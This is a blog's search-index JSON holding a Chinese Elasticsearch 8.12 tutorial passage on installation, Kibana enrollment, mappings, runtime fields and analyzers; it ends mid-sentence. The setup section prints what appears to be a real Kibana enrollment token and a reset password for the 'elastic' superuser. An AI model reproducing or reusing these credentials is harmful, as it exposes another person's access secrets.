{"meta":{"title":"Fire Flying's blog","subtitle":"","description":"","author":"Fire Flying","url":"http://fireflyingup.github.io","root":"/"},"pages":[{"title":"about","date":"2021-09-23T15:17:40.000Z","updated":"2021-09-23T15:17:40.056Z","comments":true,"path":"about/index.html","permalink":"http://fireflyingup.github.io/about/index.html","excerpt":"","text":""},{"title":"archives","date":"2021-09-23T15:42:28.000Z","updated":"2021-09-23T17:07:18.223Z","comments":true,"path":"archives/index.html","permalink":"http://fireflyingup.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-09-23T17:01:04.000Z","updated":"2021-09-23T17:09:11.188Z","comments":true,"path":"categories/index.html","permalink":"http://fireflyingup.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-09-23T16:50:47.000Z","updated":"2021-09-23T17:09:28.021Z","comments":true,"path":"tags/index.html","permalink":"http://fireflyingup.github.io/tags/index.html","excerpt":"","text":""},{"title":"schedule","date":"2021-09-23T15:42:42.000Z","updated":"2021-09-23T15:42:42.221Z","comments":true,"path":"schedule/index.html","permalink":"http://fireflyingup.github.io/schedule/index.html","excerpt":"","text":""}],"posts":[{"title":"Elasticsearch","slug":"Elasticsearch","date":"2024-03-12T08:10:38.000Z","updated":"2024-03-25T01:14:41.099Z","comments":true,"path":"2024/03/12/Elasticsearch/","link":"","permalink":"http://fireflyingup.github.io/2024/03/12/Elasticsearch/","excerpt":"","text":"Elasticsearch安装安装Elasticsearch下载 12345# 官方下载地址：https://www.elastic.co/downloads/elasticsearch# 下载curl -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.12.2-linux-x86_64.tar.gz# 解压tar -zxvf elasticsearch-8.12.2-linux-x86_64.tar.gz 启动 123cd elasticsearch-8.12.2/# -d参数 守护进程 后台运行./bin/elasticsearch 出现报错 1234567891011warning: ignoring JAVA_HOME=/usr/local/share/jdk1.8.0_391; using bundled JDKCompileCommand: exclude org/apache/lucene/util/MSBRadixSorter.computeCommonPrefixLengthAndBuildHistogram bool exclude = trueCompileCommand: exclude org/apache/lucene/util/RadixSelector.computeCommonPrefixLengthAndBuildHistogram bool exclude = trueMar 12, 2024 4:20:32 PM sun.util.locale.provider.LocaleProviderAdapter &lt;clinit&gt;WARNING: COMPAT locale provider will be removed in a future release[2024-03-12T16:20:33,746][ERROR][o.e.b.Elasticsearch ] [localhost] fatal exception while booting Elasticsearchjava.lang.RuntimeException: can not run elasticsearch as root at org.elasticsearch.server@8.12.2/org.elasticsearch.bootstrap.Elasticsearch.initializeNatives(Elasticsearch.java:282) at org.elasticsearch.server@8.12.2/org.elasticsearch.bootstrap.Elasticsearch.initPhase2(Elasticsearch.java:167) at org.elasticsearch.server@8.12.2/org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:72)See logs for more details. 使用非root用户启动elasticsearch 安装Kibana123curl -O https://artifacts.elastic.co/downloads/kibana/kibana-8.12.2-linux-x86_64.tar.gz# 解压tar -zxvf kibana-8.12.2-linux-x86_64.tar.gz 修改Kibana配置的host 123vim config/kibana.yml# 修改为以下内容server.host: &quot;0.0.0.0&quot; 启动Kibana 1./bin/kibana 生成es的token以供Kibana使用 1234[fireflying@localhost elasticsearch-8.12.2]$ bin/elasticsearch-create-enrollment-token --scope kibanawarning: ignoring JAVA_HOME=/usr/local/share/jdk1.8.0_391; using bundled JDKeyJ2ZXIiOiI4LjEyLjIiLCJhZHIiOlsiMTAuMjExLjU1LjMxOjkyMDAiXSwiZmdyIjoiNTcwMTAxMzY1MDVmNTI4MGI3YmRjNDJkZGZiNGE2MWRjMmM5NTMwZTkzNmFjNDM2M2M3ZThkNzVlOGY1YTRhMyIsImtleSI6IjFjelNNWTRCcEgxUGx4SUxad29MOmJYSnl4U2FkU1YtMzJYX1pYa0NzZFEifQ== 重置es的登录密码 12345678910# 使用auto让es自动生成elastic的密码./bin/elasticsearch-reset-password auto -u elasticwarning: ignoring JAVA_HOME=/usr/local/share/jdk1.8.0_391; using bundled JDKThis tool will reset the password of the [elastic] user to an autogenerated value.The password will be printed in the console.Please confirm that you would like to continue [y/N]yPassword for the [elastic] user successfully reset.New value: _w37+X1Zye3SSZk+dSwn mappingexplicit mapping使用详细的mapping创建index。 12345678910PUT /my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;age&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125;, &quot;email&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;name&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125; &#125; &#125;&#125; 添加一个field放入my-index-000001的索引里面，设置index为false，这意味着employee-id这个字段只会被存储 但是不会被建立索引，也不会被搜索。 123456789PUT /my-index-000001/_mapping&#123; &quot;properties&quot;: &#123; &quot;employee-id&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;index&quot;: false &#125; &#125;&#125; 查看mapping情况 1234567891011121314151617181920212223GET my-index-000001/_mapping--- response ----&#123; &quot;my-index-000001&quot;: &#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;age&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125;, &quot;email&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;employee-id&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;index&quot;: false &#125;, &quot;name&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125; &#125; &#125; &#125;&#125; 查看单独一个field的mapping 1234567891011121314151617GET /my-index-000001/_mapping/field/employee-id--- response ---&#123; &quot;my-index-000001&quot; : &#123; &quot;mappings&quot; : &#123; &quot;employee-id&quot; : &#123; &quot;full_name&quot; : &quot;employee-id&quot;, &quot;mapping&quot; : &#123; &quot;employee-id&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;index&quot; : false &#125; &#125; &#125; &#125; &#125;&#125; TF-IDF(termfrequency-inversedocument frequency，词频-逆文档频率)词频——所查找的单词在文档中出现的次数越多，得分越高。逆 文档词频——如果某个单词在所有文档中比较少见，那么该词的权重越高，得分也会 越高。 基础文档（Document）elasticsearch是面向文档的，也就是说文档是索引和搜索的最小单位，文档是json格式进行存储的。 类型（Type）类型是文档的逻辑容器，每个文档都有一个类型，比如name的类型为String，当不手动指定类型的时候，es会自己猜测它的类型，比如值为7，es会猜测该字段是长整形，后面在添加字符串，会失败。 索引（Index）索引是映射类型的容器，一个es的索引就好比mysql的数据库，索引存储了所有映射类型的字段，每个索引都有一个refresh_interval的设置，定义了索引的文档刷新的时间间隔。 索引是由一个或多个分片的数据块组成。 节点（Node）一个节点是一个es的实例，启动一个es则就代表一个节点，一台服务器也能通过不同进程启动多个es实例，也就拥有了多个节点，多个节点可以加入到一个集群。 分片（Shard）一份分片是一个目录中的文件，Lucene用这些文件存储索引数据，是包含倒排索引的文件目录。 分片分为主分片和副本分片，其中副本分片是主分片的完整副本，副本分片主要用于搜索以及主分片丢失后成为新的主分片。 索引和搜索接受索引请求的es节点首先选择文档索引到哪个分片，文档在分片中均匀分布，对于每篇文档，分片是通过其ID字符串的散列决定的。每片分片拥有相同的散列范围，接受新文档的机会均等。一旦目标分片确定，接受请求的节点会将文档转发到该分片所在的节点。随后索引操作在所有的目标分片的所有副本分片中进行。在所有可用副本分片完成文档索引后，索引命令被成功返回。 es使用round-robin的轮询机制选择可用的分片，并将搜索请求转发过去。 配置日志es安装的默认日志地址在解压tar.gz包后的logs目录下面。 es主要记录3种日志。 主要日志（elasticsearch.log） 这里记录es的主要日志信息。 慢搜索日志（elasticsearch_index_search_slowlog.json）当查询很慢时候，默认半秒以上，将在这里记录一条日志。 慢索引日志（ elasticsearch_index_indexing_slowlog.json）如果一个索引的查询时间大于半秒，将在这里记录一条日志。 Elasticsearch映射映射（Mapping）是定义了文档里面的fields如何存储在索引里面的。 每一个document是fields的集合，fields都有他们自己的数据类型。 你可以对相关document的fields集合创建一个mapping定义。 一个mapping定义包括了元数据字段，比如_source这个字段。 可以使用动态mapping和明确的mapping来定义数据，如果你不想使用默认的映射或者你想完全控制你创建的字段，那么你就使用明确的mapping定义，你也可以用es来动态的创建字段mapping。 动态mappingElasticsearch的一个重要的功能是他能摆脱干扰并且快速的探索你的数据。 当创建一个索引文档的时候，你不必首先创建一个索引，然后定义一个mapping类型，然后定义你的fields。 你可以直接写入索引文档的时候，索引、类型、字段都会自动创建。 12PUT data/_doc/1 &#123; &quot;count&quot;: 5 &#125; 以上创建了一个data索引，里面有一个count字段，count的类型会被识别为long类型。 Elasticsearch使用下面列表的规则来决定数据类型。 JSON data type &quot;dynamic&quot;:&quot;true&quot; &quot;dynamic&quot;:&quot;runtime&quot; null No field added No field added true or false boolean boolean double float double long long long object object No field added array 取决于数组里面第一个不为空的value 取决于数组里面第一个不为空的value 日期 date date 数字 float or long double or long string 带有.keyword字段的文本 keyword date检测开启date检测date_detection默认是开启的，如果string命中了dynamic_data_formats，就会被标记为date格式。 默认的dynamic_date_format格式是 [ &quot;strict_date_optional_time&quot;,&quot;yyyy/MM/dd HH:mm:ss Z||yyyy/MM/dd Z&quot;] 1234567891011121314151617181920PUT my-index-000001/_doc/1&#123; &quot;create_date&quot;: &quot;2015/09/02&quot;&#125;GET my-index-000001/_mapping --- response ---&#123; &quot;my-index-000001&quot;: &#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;create_date&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;format&quot;: &quot;yyyy/MM/dd HH:mm:ss||yyyy/MM/dd||epoch_millis&quot; &#125; &#125; &#125; &#125;&#125; 关闭date检测通过设置date_detection为false来关闭动态的日期检测机制。 1234567891011121314151617181920212223242526272829303132PUT my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;date_detection&quot;: false &#125;&#125;PUT my-index-000001/_doc/1 &#123; &quot;create_date&quot;: &quot;2015/09/02&quot;&#125;GET my-index-000001/_mapping--- response ---&#123; &quot;my-index-000001&quot;: &#123; &quot;mappings&quot;: &#123; &quot;date_detection&quot;: false, &quot;properties&quot;: &#123; &quot;create_date&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125; &#125;&#125; 可以看到被动态映射成一个text类型了。 自定义date检测格式dynamic_date_formats可以被自定义成你想要的格式，如下。 1234567891011PUT my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;dynamic_date_formats&quot;: [&quot;MM/dd/yyyy&quot;] &#125;&#125;PUT my-index-000001/_doc/1&#123; &quot;create_date&quot;: &quot;09/25/2015&quot;&#125; date patterns在数组和使用||关联的区别使用数组的时候会以第一个匹配上的文档为准 1234567891011PUT my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;dynamic_date_formats&quot;: [ &quot;yyyy/MM&quot;, &quot;MM/dd/yyyy&quot;] &#125;&#125;PUT my-index-000001/_doc/1&#123; &quot;create_date&quot;: &quot;09/25/2015&quot;&#125; 结果为 12345678910111213141516&#123; &quot;my-index-000001&quot;: &#123; &quot;mappings&quot;: &#123; &quot;dynamic_date_formats&quot;: [ &quot;yyyy/MM&quot;, &quot;MM/dd/yyyy&quot; ], &quot;properties&quot;: &#123; &quot;create_date&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;format&quot;: &quot;MM/dd/yyyy&quot; &#125; &#125; &#125; &#125;&#125; 此时如果在执行一下操作会报错 12345PUT my-index-000001/_doc/2&#123; &quot;create_date&quot;: &quot;2022/12&quot;&#125;// 这个会报错，因为他只匹配MM/dd/yyyy这种格式。 使用||链接 1234567891011PUT my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;dynamic_date_formats&quot;: [ &quot;yyyy/MM||MM/dd/yyyy&quot;] &#125;&#125;PUT my-index-000001/_doc/1&#123; &quot;create_date&quot;: &quot;09/25/2015&quot;&#125; 映射结果为 123456789101112131415&#123; &quot;my-index-000001&quot;: &#123; &quot;mappings&quot;: &#123; &quot;dynamic_date_formats&quot;: [ &quot;yyyy/MM||MM/dd/yyyy&quot; ], &quot;properties&quot;: &#123; &quot;create_date&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;format&quot;: &quot;yyyy/MM||MM/dd/yyyy&quot; &#125; &#125; &#125; &#125;&#125; 此时这两种类型的date格式都能加入进去。 数字检测当字符串为数字的情况下，会被自动检测为float或者long 12345678910111213141516171819202122232425262728293031323334PUT my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;numeric_detection&quot;: true &#125;&#125;PUT my-index-000001/_doc/1&#123; &quot;my_float&quot;: &quot;1.0&quot;, &quot;my_integer&quot;: &quot;1&quot; &#125;GET my-index-000001--- response ---&#123; &quot;my-index-000001&quot;: &#123; &quot;aliases&quot;: &#123;&#125;, &quot;mappings&quot;: &#123; &quot;numeric_detection&quot;: true, &quot;properties&quot;: &#123; &quot;my_float&quot;: &#123; &quot;type&quot;: &quot;float&quot; &#125;, &quot;my_integer&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125; &#125; &#125;, &quot;settings&quot;: &#123; ... &#125; &#125;&#125; 动态映射模板动态映射模板允许你在默认的动态模板规则之上更好的控制es映射你的数据类型，通过设置动态参数为true或者runtime来开启动态映射。然后就可以用动态模板去自定义映射，并且可以通过下面的匹配条件来动态的添加字段。 match_mapping_type 对es检测到的数据类型进行操作。 match and unmatch 使用正则去匹配字段名称。 path_match and path_unmatch 在字段的完整的点路径上操作。 如果上面都不符合，不会匹配任何字段。 ==动态字段匹配只会在字段包含一个具体的值的时候被添加，所以如果当字段是null或者是空的数组，他会在这个文档的第一个具体的值出来的时候被建立索引== match_mapping_typematch_mapping_type通过json解析出来数据类型，因为json区分不了long和interger或者double和float，所以会给number识别成long而float识别成double。 下面是一个将数字识别成interger而不是long，string识别成text的keyword。 1234567891011121314151617181920212223242526272829303132333435PUT my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;dynamic_templates&quot;: [ &#123; &quot;integers&quot;: &#123; &quot;match_mapping_type&quot;: &quot;long&quot;, &quot;mapping&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125; &#125; &#125;, &#123; &quot;strings&quot;: &#123; &quot;match_mapping_type&quot;: &quot;string&quot;, &quot;mapping&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;raw&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125; ] &#125;&#125;PUT my-index-000001/_doc/1&#123; &quot;my_integer&quot;: 5, &quot;my_string&quot;: &quot;Some string&quot; &#125; my_interger会被映射成interget。 my_string会被识别成带keyword的text。 match和unmatchmatch使用一个或多个来匹配字段名，unmatch使用一个或多个来排除被match匹配上的字段。 使用match_pattern来支持正则，例如： 12&quot;match_pattern&quot;: &quot;regex&quot;,&quot;match&quot;: &quot;^profit_\\d+$&quot; 1234567891011121314151617181920212223PUT my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;dynamic_templates&quot;: [ &#123; &quot;longs_as_strings&quot;: &#123; &quot;match_mapping_type&quot;: &quot;string&quot;, &quot;match&quot;: &quot;long_*&quot;, // 可以支持数组 &quot;match&quot;: [&quot;long_*&quot;, &quot;integer_*&quot;] &quot;unmatch&quot;: &quot;*_text&quot;, // 可以支持数组 &quot;mapping&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125; &#125; &#125; ] &#125;&#125;PUT my-index-000001/_doc/1&#123; &quot;long_num&quot;: &quot;5&quot;, &quot;long_text&quot;: &quot;foo&quot; &#125; string类型的long_num字段由于匹配上了match的long_*规则，所以他的类型为long。 string类型的long_text字段由于匹配上了unmatch的*_text规则，所以他的类型还是string。 path_match和path_unmatch它会匹配全路径名称而不是最终的名字，比如name.first，而match匹配的是first。 “norms”:false 来关闭评分 “index”:false 来关闭索引 用于减少磁盘空间 明确的mapping创建一个明确的mapping索引 12345678910PUT /my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;age&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125;, &quot;email&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;name&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125; &#125; &#125;&#125; 添加一个字段到已存在的mapping里面 123456789PUT /my-index-000001/_mapping&#123; &quot;properties&quot;: &#123; &quot;employee-id&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;index&quot;: false &#125; &#125;&#125; 查看单个字段的映射 1GET /my-index-000001/_mapping/field/employee-id 运行时字段 添加字段到已经存在的文档而不需要重建索引 直接和你的数据打交道而不用知道它的结构 在查询的时候从一个索引字段里面重写返回值 定义一个明确的字段而不是修改底层结构 运行时字段不会建立索引，所以建立一个运行时字段不会增大索引大小。 如果不知道以后该展示成什么样，可以使用运行时字段，后期可以更改。 运行时字段可以对现有索引字段进行操作，比如求平均数等等。 12345678910111213POST my-index-000001/_bulk?refresh=true&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516729294000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.2&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516642894000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.8&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516556494000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.1&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516470094000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.6&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516383694000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;4.2&quot;,&quot;start&quot;: &quot;400&quot;,&quot;end&quot;:&quot;8625309&quot;&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516297294000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;4.0&quot;,&quot;start&quot;: &quot;400&quot;,&quot;end&quot;:&quot;8625309&quot;&#125;&#125; 添加运行时字段 1234567891011PUT my-index-000001/_mapping&#123; &quot;runtime&quot;: &#123; &quot;measures.start&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;measures.end&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125; &#125;&#125; 求start和end各自的平均值 1234567891011121314151617181920212223242526GET my-index-000001/_search&#123; &quot;aggs&quot;: &#123; &quot;avg_start&quot;: &#123; &quot;avg&quot;: &#123; &quot;field&quot;: &quot;measures.start&quot; &#125; &#125;, &quot;avg_end&quot;: &#123; &quot;avg&quot;: &#123; &quot;field&quot;: &quot;measures.end&quot; &#125; &#125; &#125;&#125;--- response ---&#123; &quot;aggregations&quot; : &#123; &quot;avg_start&quot; : &#123; &quot;value&quot; : 333.3333333333333 &#125;, &quot;avg_end&quot; : &#123; &quot;value&quot; : 8658642.333333334 &#125; &#125;&#125; 也可以求end-start的各项指标 1234567891011121314151617181920212223242526272829303132GET my-index-000001/_search&#123; &quot;runtime_mappings&quot;: &#123; &quot;duration&quot;: &#123; &quot;type&quot;: &quot;long&quot;, &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot; emit(doc[&#x27;measures.end&#x27;].value - doc[&#x27;measures.start&#x27;].value); &quot;&quot;&quot; &#125; &#125; &#125;, &quot;aggs&quot;: &#123; &quot;duration_stats&quot;: &#123; &quot;stats&quot;: &#123; &quot;field&quot;: &quot;duration&quot; &#125; &#125; &#125;&#125;--- response ---&#123; &quot;aggregations&quot; : &#123; &quot;duration_stats&quot; : &#123; &quot;count&quot; : 6, &quot;min&quot; : 8624909.0, &quot;max&quot; : 8675009.0, &quot;avg&quot; : 8658309.0, &quot;sum&quot; : 5.1949854E7 &#125; &#125;&#125; 查找的时候重写value 12345678910111213POST my-index-000001/_bulk?refresh=true&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516729294000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.2&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516642894000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.8&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516556494000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.1&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516470094000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.6&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516383694000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:4.2&#125;&#125;&#123;&quot;index&quot;:&#123;&#125;&#125;&#123;&quot;@timestamp&quot;:1516297294000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:4.0&#125;&#125; 查找的时候对model_number=HG537PU的measures.voltage进行*1.7得操作。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667POST my-index-000001/_search&#123; &quot;runtime_mappings&quot;: &#123; &quot;measures.voltage&quot;: &#123; &quot;type&quot;: &quot;double&quot;, &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot;if (doc[&#x27;model_number.keyword&#x27;].value.equals(&#x27;HG537PU&#x27;)) &#123;emit(1.7 * params._source[&#x27;measures&#x27;][&#x27;voltage&#x27;]);&#125; else&#123;emit(params._source[&#x27;measures&#x27;][&#x27;voltage&#x27;]);&#125;&quot;&quot;&quot; &#125; &#125; &#125;, &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;model_number&quot;: &quot;HG537PU&quot; &#125; &#125;, &quot;fields&quot;: [&quot;measures.voltage&quot;]&#125;--- response ---&#123; ... &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0296195, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my-index-000001&quot;, &quot;_id&quot; : &quot;F1BeSXYBg_szTodcYCmk&quot;, &quot;_score&quot; : 1.0296195, &quot;_source&quot; : &#123; &quot;@timestamp&quot; : 1516383694000, &quot;model_number&quot; : &quot;HG537PU&quot;, &quot;measures&quot; : &#123; &quot;voltage&quot; : 4.2 &#125; &#125;, &quot;fields&quot; : &#123; &quot;measures.voltage&quot; : [ 7.14 ] &#125; &#125;, &#123; &quot;_index&quot; : &quot;my-index-000001&quot;, &quot;_id&quot; : &quot;l02aSXYBkpNf6QRDO62Q&quot;, &quot;_score&quot; : 1.0296195, &quot;_source&quot; : &#123; &quot;@timestamp&quot; : 1516297294000, &quot;model_number&quot; : &quot;HG537PU&quot;, &quot;measures&quot; : &#123; &quot;voltage&quot; : 4.0 &#125; &#125;, &quot;fields&quot; : &#123; &quot;measures.voltage&quot; : [ 6.8 ] &#125; &#125; ] &#125;&#125; 字段数据类型每个字段都有数据类型，数据类型决定了它存储的数据。如你可以将string定义为text或者keyword字段，text可以被全文搜索，而keyword保留原样作为筛选和排序。 数据类型有不同的分组，相同分组下的字段有着相同的搜索行为，但是不同的空间使用和性能特征。 常用类型如下 公共类型 binary Binary将被编码成base64的字符串。 boolean true或者``false`。 Keywords 关键字家族，包括keyword、constant_word和wildcard。 Numbers 数字类型，如long和double，用来表示数量。 Dates 日期， 包括 date 和 date_nanos。 alias 别名，为一个存在的字段设置别名。 对象和关系字段（Objects and relational types） object 一个json的对象。 flattened 整个json对象作为单个字段值。 nested 保留其子地段关系的json对象。 join 定义同一索引文档中的父子关系。 结构化数据类型 Range 范围类型，如long_range，double_range，date_range和ip_range。 ip ipv4或者ipv6地址。 文本搜索类型 text fields 文本家族，包括text，match_only_text 元数据类型身份元数据字段_index：文档所属的索引。 _id：文档的id。 文档资源元数据字段_source：文档中的JSON内容。 _size：_source字段的字节数组长度，由mapper-size plugin 这个插件提供。 Doc统计元数据字段_doc_count：当文档展示预聚合数据时，用于存储文档计数的自定义字段。 索引元数据字段_field_names：文档内包含非空值的字段。 _ignore：文档中因ignore_malformed 在索引中被忽略的所有字段。 路由元数据字段_routing：路由一个文档到一个特定的分片的自定义路由值。 其他的元数据字段_meta：应用程序指定的特殊元数据单元。 _tire：文档所属索引的当前数据首选项。 文本分析文本分析使es去全文搜索，包括模糊搜索，而不仅仅是精确搜索。 分析器的原理分析器有三个步骤 1、字符过滤（Character filters） 字符过滤对源文本的字节流进行添加、删除、替换等操作。如对拉丁-阿拉伯数字的转换，对html标签的转换。 2、分词器（Character filters） 将获取到的字符流按照分词器的规则分割成很多个词。比如说whitespace 分词器将”Quick brown fox!”切割成[Quick, brown, fox!]三个词。 3、分词过滤器（Token filters） 分词过滤器对分词进行添加、删除、修改等操作。比如说lowercase 分词过滤器让所有的分词变成小写，stop分词过滤器移除掉the这种公共的单词，synonym分词过滤器添加了同义词的功能。 内置分析Standard AnalyzerStandard分析器是内置的默认分析器，是安装Unicode文本分割算法来对文本进行分割成多个词，它会移除一些标点符号、词小写、支持一些暂停词。 有如下几个参数 max_token_length(默认255)：如果一个词长度大于这个值，就会将词按这个长度切割，比如hello这个词，max_token_length为4的话会被切割成hell和o两个。 stopwords(默认NONE)：暂停词，表示会主动删除一些经常出现的词，比如stopwords为_english_的时候会排除the这种出现比较多的词。 stopwords_path：指定包含一些暂停词的文件。 1234567891011121314151617181920212223PUT my-index-000001&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;analyzer&quot;: &#123; &quot;my_english_analyzer&quot;: &#123; &quot;type&quot;: &quot;standard&quot;, &quot;max_token_length&quot;: 5, &quot;stopwords&quot;: &quot;_english_&quot; &#125; &#125; &#125; &#125;&#125;POST my-index-000001/_analyze&#123; &quot;analyzer&quot;: &quot;my_english_analyzer&quot;, &quot;text&quot;: &quot;The 2 QUICK Brown-Foxes jumped over the lazy dog&#x27;s bone.&quot;&#125;--- response ---[ 2, quick, brown, foxes, jumpe, d, over, lazy, dog&#x27;s, bone ] Simple AnalyzerSimple分析器按照非字母字符来切割，比如说数字、空格、连字符等，丢弃非字母的字符，全部转换为小写。 1234567POST _analyze&#123; &quot;analyzer&quot;: &quot;simple&quot;, &quot;text&quot;: &quot;The 2 QUICK Brown-Foxes jumped over the lazy dog&#x27;s bone.&quot;&#125;--- response ---[ the, quick, brown, foxes, jumped, over, the, lazy, dog, s, bone ] WhiteSpace AnalyzerWhiteSpace分析器按照空白字符切割。 Stop AnalyzerStop analyzer 和 Simple analyzer差不多，唯一多了一个功能就是支持stop words，有stopwords和stopwords_path两个参数。 Keyword Analyzer不分词，就将全部当成一个词。 Pattern Analyzer支持正则的分词器，默认值\\W+。 参数有pattern、flags、lowercase（默认true）、stopwords（默认_none_）、stopwords_path 分词器Letter Tokenizer按照非字母分词。 Lowercase TokenizerLetter Tokenizer加小写。 Pattern Tokenizer按照正则的内容进行切割，默认\\w+ 1234567891011121314151617181920212223242526PUT my-index-000001&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;analyzer&quot;: &#123; &quot;my_analyzer&quot;: &#123; &quot;tokenizer&quot;: &quot;my_tokenizer&quot; &#125; &#125;, &quot;tokenizer&quot;: &#123; &quot;my_tokenizer&quot;: &#123; &quot;type&quot;: &quot;pattern&quot;, &quot;pattern&quot;: &quot;,&quot; &#125; &#125; &#125; &#125;&#125;POST my-index-000001/_analyze&#123; &quot;analyzer&quot;: &quot;my_analyzer&quot;, &quot;text&quot;: &quot;comma,separated,values&quot;&#125;--- response ---[ comma, separated, values ] Simple Pattern Tokenizer将正则表达式捕获的内容当做词，默认是空字符串。 1234567891011121314151617181920212223242526PUT my-index-000001&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;analyzer&quot;: &#123; &quot;my_analyzer&quot;: &#123; &quot;tokenizer&quot;: &quot;my_tokenizer&quot; &#125; &#125;, &quot;tokenizer&quot;: &#123; &quot;my_tokenizer&quot;: &#123; &quot;type&quot;: &quot;simple_pattern&quot;, &quot;pattern&quot;: &quot;[0123456789]&#123;3&#125;&quot; &#125; &#125; &#125; &#125;&#125;POST my-index-000001/_analyze&#123; &quot;analyzer&quot;: &quot;my_analyzer&quot;, &quot;text&quot;: &quot;fd-786-335-514-x&quot;&#125;--- response ---[ 786, 335, 514 ] Simple Pattern Split Tokenizer按照正则切割生成词，功能比Pattern和Simple 